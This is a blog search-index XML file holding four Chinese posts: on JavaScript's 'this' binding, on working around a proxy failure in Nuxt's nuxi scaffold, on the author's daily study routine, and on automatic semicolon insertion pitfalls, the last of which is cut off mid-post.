<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>简单理解JS中的this关键字</title>
    <link href="/2023/01/01/this/"/>
    <url>/2023/01/01/this/</url>
    
    <content type="html"><![CDATA[    <div id="aplayer-iAtIOOvu" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1819827969" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p>之前在看<a href="https://github.com/getify/You-Dont-Know-JS/blob/1st-ed/README.md">《You Don’t Know JS - 1st Edition》</a>这本书的时候，它对this的解释是针对各个this在哪里被调用分为四种情况。</p><ul><li>默认绑定 (独立函数调用)</li><li>隐式绑定 (作为方法调用)</li><li>显示绑定 (call、this、bind)</li><li>new绑定 (构造函数中的this)</li></ul><p>书中分别解释了在四种情况中this的值应该是什么。我也记住了，但是总感觉缺少某根<strong>线</strong>，把这四种情况串联起来。</p><p>这几天在看 <a href="https://www.oreilly.com/library/view/javascript-the-definitive/9781491952016/">《JavaScript: The Definitive Guide, Seventh Edition》</a> 这本书，我直接看的英文版，我看到目前的评价是，不愧是权威指南，整本书都非常通俗易懂，看英文版完全没有任何障碍。</p><p>权威指南中对this的解释提出了那根<strong>线</strong>，把this在不同情况下都串联起来的<strong>线</strong>。</p><p><strong>函数体中的this 指向 函数作为方法被调用时所在的那个对象。</strong></p><h1 id="解释"><a class="markdownIt-Anchor" href="#解释"></a> 解释</h1><h2 id="作为方法调用"><a class="markdownIt-Anchor" href="#作为方法调用"></a> 作为方法调用</h2><p>这是最清晰的一种情形。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> o = &#123;                 <span class="hljs-comment">// define an object o</span><br>  <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;                     <span class="hljs-comment">// define a function f as a method of o</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === o) <span class="hljs-comment">// =&gt; true</span><br>  &#125;<br>&#125;<br>o.<span class="hljs-title function_">f</span>()<br></code></pre></td></tr></table></figure><p>这里的函数f是作为对象o的一个方法被调用的，所以this指向对象o</p><p>《You Don’t Know JS》中的隐式绑定就属于这种最简单和清晰的情况。</p><h2 id="独立函数调用"><a class="markdownIt-Anchor" href="#独立函数调用"></a> 独立函数调用</h2><p>这种情况对应《You Don’t Know JS》中默认绑定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === globalThis) <span class="hljs-comment">// =&gt; true</span><br>&#125;<br><span class="hljs-title function_">f</span>()<br></code></pre></td></tr></table></figure><p>函数单独调用，这时this会指向全局对象。你可以这样想，这时f就像全局对象的一个方法，直接调用这个函数，可以看作调用了全局对象globalThis的方法f，所以this指向globalThis。</p><p>这样想是有一定道理的，在浏览器环境下，f确实会成为全局对象的一个方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === globalThis)<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f === globalThis.<span class="hljs-property">f</span>)     <span class="hljs-comment">// =&gt; true</span><br></code></pre></td></tr></table></figure><p>但是这样想不太准确，在node环境下函数f根本不是全局对象的一个方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === globalThis)<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalThis.<span class="hljs-property">f</span>)         <span class="hljs-comment">// =&gt; undefined</span><br></code></pre></td></tr></table></figure><p>是不是感觉乱乱的？还好在严格模式下，这种独立函数调用的情况，this将直接指向undefined。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === <span class="hljs-literal">undefined</span>) <span class="hljs-comment">// =&gt; true</span><br>&#125;<br><span class="hljs-title function_">f</span>()<br></code></pre></td></tr></table></figure><p>这实际上也很好理解，因为形式上f调用时没有作为任何对象的方法，所以undefined是合理的。</p><h2 id="显示绑定"><a class="markdownIt-Anchor" href="#显示绑定"></a> 显示绑定</h2><p>利用call、apply、bind修改this的指向。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === o) <span class="hljs-comment">// =&gt; true</span><br>&#125;<br><span class="hljs-keyword">const</span> o = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;wuuconix&quot;</span><br>&#125;<br>f.<span class="hljs-title function_">call</span>(o)<br></code></pre></td></tr></table></figure><p>我们单独拿出<code>f.call(o)</code>这条语句来看，它看起来是不是就是在说，把函数f在对象o上运行？所以显示绑定在某种程度上也可以看作暂时把函数f当作了对象o的方法，然后调用。</p><h2 id="构造函数中的this"><a class="markdownIt-Anchor" href="#构造函数中的this"></a> 构造函数中的this</h2><p>这对应《You Don’t Know JS》中 new绑定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name<br>&#125;<br><span class="hljs-keyword">const</span> f = <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>(<span class="hljs-string">&quot;wuuconix&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property">name</span>)         <span class="hljs-comment">// =&gt; &quot;wuuconix&quot;</span><br></code></pre></td></tr></table></figure><p>在这里，定义了一个构造函数F，然后利用new关键字调用了这个构造函数F，生成了一个对象f。</p><p>我们知道，构造函数中的this实际上就是f，即新生成的对象。</p><p>所以这可以怎么看呢？调用new调用构造函数时，JS会先生成一个空对象，然后把构造函数F作为这个空对象的方法去调用，这时this就是空对象了，之后构造函数的语句依次被调用，这个对象初始化完毕后自动返回，就是f了。</p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>利用这跟线 <strong>函数体中的this 指向 函数作为方法被调用时所在的那个对象</strong> 虽然有些不合理，但是确实能够较好的&quot;解释&quot;和记住this在各种情况下的情况。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nuxt脚手架nuxi初始化失败原因&amp;解决方法</title>
    <link href="/2022/11/06/nuxi/"/>
    <url>/2022/11/06/nuxi/</url>
    
    <content type="html"><![CDATA[    <div id="aplayer-mTsVgRLd" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1454018351" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h2><p>前几天终于把毕业设计的开题报告整完了，有了一点时间干自己的事，于是就想着学学nuxt3。</p><p>结果发现跟着<a href="https://v3.nuxtjs.org/getting-started/installation">官方教程</a>敲的第一行命令就出现了问题。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">npx nuxi <span class="hljs-keyword">init</span> nuxt3-app<br></code></pre></td></tr></table></figure><p>这行代码是nuxt的脚手架，会生成一个最简单的模板项目。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vev5j11lj30uu07n0z8.jpg" alt="脚手架报错" /></p><p>这行命令会去github拉取相关文件，然后连接失败报错了。</p><p>国内由于墙的墙的原因，raw.githubusercontent.com这个域名受到了DNS污染，没法连接看好像挺合理的，但是关键我平时都是开着代理的。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vf25gmdoj30up0cbdps.jpg" alt="curl能够正常获取" /></p><p>如图所示，我直接用curl没有一点问题，能够正确获取 <a href="http://raw.githubusercontent.com">raw.githubusercontent.com</a> 上的文件。</p><p>看来，唯一的解释就是脚手架node程序没有走代理。</p><h2 id="原因的确认"><a class="markdownIt-Anchor" href="#原因的确认"></a> 原因的确认</h2><p>经过简单搜索，我在nuxt framework仓库中的<a href="https://github.com/nuxt/framework/issues/8002">issue #8002</a> 找到了类似情况。</p><p>从中可以了解到 nuxt的脚手架 nuxi 使用了 <a href="https://github.com/unjs/giget">giget</a> 来从<a href="https://github.com/nuxt/starter">nuxt项目模板仓库</a>中获取文件。</p><p>giget干的事情很简单，就是利用node从github上拉取相应仓库。实际上giget貌似是nuxt团队对另一个相似的项目<a href="https://github.com/Rich-Harris/degit">degit</a>的拙劣仿制。</p><p>两者都可以用方便的命令从github拉取仓库。</p><p>唯一的不同就是degit支持自动从环境变量中获取<code>https_proxy</code>进行代理，而giget完全没有考虑这一点。</p><blockquote><p>HTTPS proxying<br />If you have an https_proxy environment variable, Degit will use it.</p></blockquote><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vgzykucbj30oa03pgnr.jpg" alt="degit和giget对比" /></p><h2 id="临时解决办法"><a class="markdownIt-Anchor" href="#临时解决办法"></a> 临时解决办法</h2><p>目前nuxt社区已经注意到了此情况，在giget中提出了相关<a href="https://github.com/unjs/giget/issues/23">issue</a>，而且有一个大佬已经提交了相关<a href="https://github.com/unjs/giget/pull/24">PR</a>。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vg58qaarj307k01rjrn.jpg" alt="PR opened 2 days ago" /></p><p>可惜PR已经提出2天了，也没有相关回复，并入giget仓库不知道还要花多久。</p><p>这里我给出两个解决办法</p><h3 id="1手动克隆模板仓库"><a class="markdownIt-Anchor" href="#1手动克隆模板仓库"></a> (1)手动克隆模板仓库</h3><p>其实，从之前我们也知道了，所谓的脚手架实际上就是拉去<a href="https://github.com/nuxt/starter">nuxt项目模板仓库</a>中的文件。</p><p>所以我们只需要手动git clone即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone -b v3 https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/nuxt/</span>starter.git nuxt3-app<br></code></pre></td></tr></table></figure><p>-b 是指定分支，目前最新的nuxt3在v3分支。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vgcx4fumj30mz080788.jpg" alt="git clone" /></p><h3 id="2使用支持https代理的degit"><a class="markdownIt-Anchor" href="#2使用支持https代理的degit"></a> (2)使用支持https代理的degit</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">degit <span class="hljs-string">&#x27;nuxt/starter#v3&#x27;</span> <span class="hljs-symbol">nuxt3</span>-app<br></code></pre></td></tr></table></figure><p><code>#v3</code>代表下载相应分支。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vgdqx1f6j30l604xgnt.jpg" alt="degit" /></p><p>这里我更推荐使用degit，因为代码量少，而且degit拉取的项目中不包含模板仓库的.git目录。</p><h2 id="思考node程序如何支持代理"><a class="markdownIt-Anchor" href="#思考node程序如何支持代理"></a> 思考：node程序如何支持代理</h2><p>观察那位大佬提交的<a href="https://github.com/unjs/giget/pull/24/commits/ffb38f9ffcb2b6cc82ef8bab5bb256ce88447e43?diff=split&amp;w=0">PR</a>可以看到，他使用了<a href="https://github.com/TooTallNate/node-https-proxy-agent">https-proxy-agent</a>实现代理。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h7vglm0wr7j30ug09541v.jpg" alt="PR detail" /></p><p>这里对https-proxy-agent做了简单试用。</p><p>代码: <a href="https://stackblitz.com/edit/node-zwkzaa?embed=1&amp;file=index.js">https://stackblitz.com/edit/node-zwkzaa?embed=1&amp;file=index.js</a></p><p>不适用代理的情况：</p><script id="asciicast-lDkYzyLr6DyQQQuoypNYQyOeE" src="https://asciinema.org/a/lDkYzyLr6DyQQQuoypNYQyOeE.js" async></script><p>使用代理的情况:</p><script id="asciicast-e8SOmiXMRPpVRqEpFM1XFgKvH" src="https://asciinema.org/a/e8SOmiXMRPpVRqEpFM1XFgKvH.js" async></script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>nuxt</tag>
      
      <tag>node.js</tag>
      
      <tag>proxy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我躺平又不摆烂的日常生活</title>
    <link href="/2022/10/08/my-daily-tour/"/>
    <url>/2022/10/08/my-daily-tour/</url>
    
    <content type="html"><![CDATA[<script src="/js/APlayer.min.js"></script>        <div id="aplayer-vkdFbcMN" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-vkdFbcMN"),            narrow: false,            autoplay: false,            showlrc: 3,            music: {              title: "恋",              author: "星野源",              url: "https://uconix-my.sharepoint.com/:u:/g/personal/wu_uconix_onmicrosoft_com/ESnFgO9OwjBBhmOA8aUaVJMBqZS3pmRlR3Qo6fle0qXjjg?download=1",              pic: "https://api.injahow.cn/meting/?server=netease&type=pic&id=109951164332825582",              lrc: "https://paste.wuuconix.link/raw/7817e6089cdb49e48d1d353490dcaaec"            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><h1 id="前情提要"><a class="markdownIt-Anchor" href="#前情提要"></a> 前情提要</h1><p>在今年3月份正式确立了将来要成为一名前端工程师的目标的之后，很幸运的，我获得了某中厂的提前批offer。</p><p>在那之后，我正式步入了躺平生活，秋招正式批里一份简历也没投。</p><p>原因也很简单，在4月份的时候，我满怀期待地准备找一份前端地暑期实习，当时面了字节跳动、美团、腾讯等大厂，当然了，全部挂掉了。</p><p>所以我认为自己的知识水平远没有到达大厂的高度。</p><p>在收到中厂offer之前，我对自己的信心到了低谷，甚至有了在家里附近随便找一家迷你厂上班的打算了，所以我非常感谢这个中厂。</p><p>虽然躺平没投简历，但是我每天仍然保持学习前端知识，没有摆烂。</p><h1 id="每天在学什么"><a class="markdownIt-Anchor" href="#每天在学什么"></a> 每天在学什么</h1><p>简单来说，可以分为三项。看书、刷题、看文档。</p><h2 id="book"><a class="markdownIt-Anchor" href="#book"></a> Book</h2><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h6y1s6m2npj30y80rrzwn.jpg" alt="CSS新世界" /></p><p>最近一直在看张鑫旭的《CSS新世界》，每天30页，已经看了快1000页了，很快就要看完了！</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h6y1y3r28qj31500rl4qp.jpg" alt="JavaScript二十年" /></p><p>JavaScript二十年可以算是一本历史书，是JS的作者Brendan Eic参与编写的，简述JS前20年的故事，我直接下载了英文原版pdf，每页都有好多好多单词233，感觉和读论文的感觉一样🤣。</p><p>图片里黄色的是生词哈哈，希望我读完后词汇量大涨（</p><p>因为每页量太大了，所以每天只看3页</p><h2 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h2><p>刷题还是得刷的！最近我一个月我一直跟着代码随想录刷Leetcode</p><p>Leetcode上已经连续提交34天啦！还利用<a href="https://github.com/JacobLinCool/LeetCode-Stats-Card">JacobLinCool/LeetCode-Stats-Card</a>给我的Github仓库加上了漂亮的Leetcode Card😍</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h6y2duyhbbj30qj0sqanh.jpg" alt="Leetcode card" /></p><p>当然啦，不会多刷的！每天1~2道，佛系，佛系！</p><h2 id="doc"><a class="markdownIt-Anchor" href="#doc"></a> Doc</h2><p>最近还在看一些文档。学习新技术的最好办法就是去看它的官方文档，而且还是得英文版（中文翻译经常年久失修，可能已经落后很多个版本了</p><div class="box">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y2mmzpjlj315h0rr4g1.jpg" alt="Vue官方文档">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y2qk412qj316d0rkx0l.jpg" alt="MDN教程">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y2o3f258j317s0rnwvx.jpg" alt="typescript handbook"></div><style>.box {    display: grid;    grid-template-columns: repeat(1, 1fr);    gap: 20px;    justify-items: center;    align-items: center;    margin-bottom: 20px;}img.doc {    width: 100%;    height: 100%;    object-fit: cover;    filter: drop-shadow(4px 4px 8px gray);    border-radius: 4px;}@media (min-width: 700px) {    .box {        grid-template-columns: repeat(2, 1fr);    }}</style><p>这里再分享一个小妙招，英文文档总有遇到生词的时候，之前我会把生词记载小本本上。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h6y3bjugf7j30yg0pu4qp.jpg" alt="小本本" /></p><p>然而在缺乏复习的情况下根本记不住，而且因为早已丢失单词本来的语境，就更加不好背了。</p><p>所以我现在更换了办法，直接在pdf上做标注！（冷知识：网页可以Ctrl+P然后生成为pdf</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h6y3ixrpl7j33342bc14z.jpg" alt="三星Note3" /></p><p>具体的方法是从天哥那白嫖的三星Note3 配合 SuperDisplay 做电脑的副屏，然后用Spen来书写、标记哈哈。</p><h1 id="学习之外"><a class="markdownIt-Anchor" href="#学习之外"></a> 学习之外</h1><h2 id="gta5"><a class="markdownIt-Anchor" href="#gta5"></a> GTA5</h2><p>每天睡前我都会推一推GTA5的主线剧情哈哈，目前已经推到35%左右了。</p><p>一些任务完成的截图。</p><div class="box2">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y44leg6bj31h60t8aef.jpg" alt="面具">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y45k43obj31h60t8gqb.jpg" alt="连身工作服">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y42uiub3j31h60t8n4c.jpg" alt="理查兹先生">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y43lvdd5j31h60t8779.jpg" alt="拒不伏法">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y4cq2379j31h60t8n1n.jpg" alt="死里逃生">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y470pe1ej31h60t878s.jpg" alt="天网恢恢"></div><style>.box2 {    display: grid;    grid-template-columns: repeat(2, 1fr);    gap: 20px;    justify-items: center;    align-items: center;    margin-bottom: 20px;}</style><p>做完任务之后<s>偶尔</s>经常搞怪一下室友。</p><div class="box2">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y4apvjxyj31h60t8gqj.jpg" alt="老杜">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y4f1twqzj31hc0u07b2.jpg" alt="老杜SB">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y4ftiogcj31h60t8gq9.jpg" alt="老杜SB2">    <img class="doc" src="https://sina.wuuconix.link/large/007YVyKcly1h6y4gp8jbbj31hc0u07wh.jpg" alt="颖, 你好！"></div><h2 id="锻炼"><a class="markdownIt-Anchor" href="#锻炼"></a> 锻炼</h2><p>最近买了个瑜伽垫，希望能坚持下去！</p><p>我一般会在Keep上跟着做 腹肌撕裂者 &amp; HIIT 活力激活 &amp; 哑铃手臂训练入门 这三门课。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h6y4vxqrikj30bx0nkq4t.jpg" alt="" /></p><h1 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h1><p>祝看到这里的你一切顺利！</p><p>wuuconix’s daily tour is over here. 散会！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>daily</tag>
      
      <tag>share</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JS该写分号嘛？</title>
    <link href="/2022/08/06/asi/"/>
    <url>/2022/08/06/asi/</url>
    
    <content type="html"><![CDATA[<h1 id="asi"><a class="markdownIt-Anchor" href="#asi"></a> ASI</h1><p>在写JS之前，我一直在写Python，习惯了没有分号的代码。</p><p>刚好，JS为我们提供了 自动分号插入 <code>Automatic Semicolon Insertion</code>！</p><p>这让我们在大部分情况下都不用写分号，非常的优雅。</p><p>然而ASI在某些情况下将产生错误。</p><h1 id="asi发生错误的情况"><a class="markdownIt-Anchor" href="#asi发生错误的情况"></a> ASI发生错误的情况</h1><h2 id="iife-立即调用函数表达式"><a class="markdownIt-Anchor" href="#iife-立即调用函数表达式"></a> IIFE 立即调用函数表达式</h2><p>考虑以下代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span><br>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)<br>&#125;)()<br></code></pre></td></tr></table></figure><p>我们很容易就能看懂这段代码的意思，首先定义了值为1的变量a，然后定义了一个函数log用来输出a的值并且立即调用它。</p><p>按理说这段代码的执行结果是输出1，但是实际上却报错了。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">&gt; node <span class="hljs-number">1</span>.js<br>/root/<span class="hljs-number">1</span>.js:<span class="hljs-number">2</span><br>(<span class="hljs-keyword">function</span> <span class="hljs-title">log</span>() &#123;<br>^<br><br>TypeError: 1 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> a <span class="hljs-keyword">function</span><br></code></pre></td></tr></table></figure><p>提示显示1不是一个函数，看来引擎把代码理解成了这个样子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)&#125;)()<br></code></pre></td></tr></table></figure><p>想去call 1，这自然会报错。</p><h2 id="利用解构语语法swap的时候"><a class="markdownIt-Anchor" href="#利用解构语语法swap的时候"></a> 利用解构语语法swap的时候</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">2</span><br>[a, b] = [b, a]<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`a: <span class="hljs-subst">$&#123;a&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`b: <span class="hljs-subst">$&#123;b&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>很容易看出这段代码的意思是交换变量a和b的值，然后分别输出。</p><p>然而又报错了。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt; node <span class="hljs-number">1</span><span class="hljs-selector-class">.js</span><br>/root/<span class="hljs-number">1</span><span class="hljs-selector-class">.js</span>:<span class="hljs-number">2</span><br><span class="hljs-selector-attr">[a, b]</span> = <span class="hljs-selector-attr">[b, a]</span><br>    ^<br><br>ReferenceError: Cannot access <span class="hljs-string">&#x27;b&#x27;</span> before initialization<br></code></pre></td></tr></table></figure><p>和IIFE一样，引擎把代码理解成了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">2</span>[a, b] = [b, a]<br></code></pre></td></tr></table></figure><p>逗号后面是一个连等，需要从右边往左看，即先看<code>2[a, b] = [b, a]</code></p><p>而这个赋值语句中已经用到了b，而这个时候b还没有初始化，所以由于暂时性死区的原因，报错了。</p><p>至少是报错了，我们可以知道某个地方出了问题，如果没有报错呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">2</span>, c = <span class="hljs-number">3</span>, d = <span class="hljs-number">4</span><br><span class="hljs-keyword">if</span> (a &lt; b) &#123;<br>    [a, b] = [b, a]<br>    [c, d] = [d, c]<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`a: <span class="hljs-subst">$&#123;a&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`b: <span class="hljs-subst">$&#123;b&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`c: <span class="hljs-subst">$&#123;c&#125;</span>`</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`d: <span class="hljs-subst">$&#123;d&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>这段代码不会报错，以下是它的输出结果</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-punctuation">&gt;</span> <span class="hljs-string">node 1.js</span><br><span class="hljs-attribute">a</span><span class="hljs-punctuation">:</span> <span class="hljs-string">4</span><br><span class="hljs-attribute">b</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3</span><br><span class="hljs-attribute">c</span><span class="hljs-punctuation">:</span> <span class="hljs-string">3</span><br><span class="hljs-attribute">d</span><span class="hljs-punctuation">:</span> <span class="hljs-string">4</span><br></code></pre></td></tr></table></figure><p>js把中间的两个swap看成了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">[a, b] = [b, a][c, d] = [d, c]<br></code></pre></td></tr></table></figure><p>仍然是一个连等，我们需要从右往左看，首先是<code>[b, a][c, d] = [d, c]</code></p><p>左边的<code>[b, a][c, d]</code> 实际上是 <code>[2, 1][3, 4]</code></p><p>你可能会说卧槽，这他妈什么东西。</p><p>我们慢慢看。首先<code>[2, 1]</code>是一个数组。</p><p>然后它后面的<code>[3, 4]</code>实际上是一个下标选择，里面的<code>3, 4</code>会被看成一个逗号表达式，它的值是最后一个元素，即4。</p><p>所以<code>[2, 1][3, 4]</code>可以写为<code>[1, 2][4]</code>，所以最后的值是undefined。</p><p>所以总的语句就变成了<code>[a, b] = undefined = [d, c]</code></p><p>你可能又想吐槽<code>undefined = [d, c]</code>算什么鬼，实际上undefined是可以作为左操作数的，只不过静默失败。</p><p><img src="https://sina.wuuconix.link/large/007YVyKcly1h4xh1nfdjaj308g04fwf7.jpg" alt="undefined赋值静默失败" /></p><p>然后值得注意的是，<code>undefined = [d, c]</code>虽然对undefined本身没有影响，但是它本身作为一个赋值表达式也是有值的，它的值就是<code>[d, 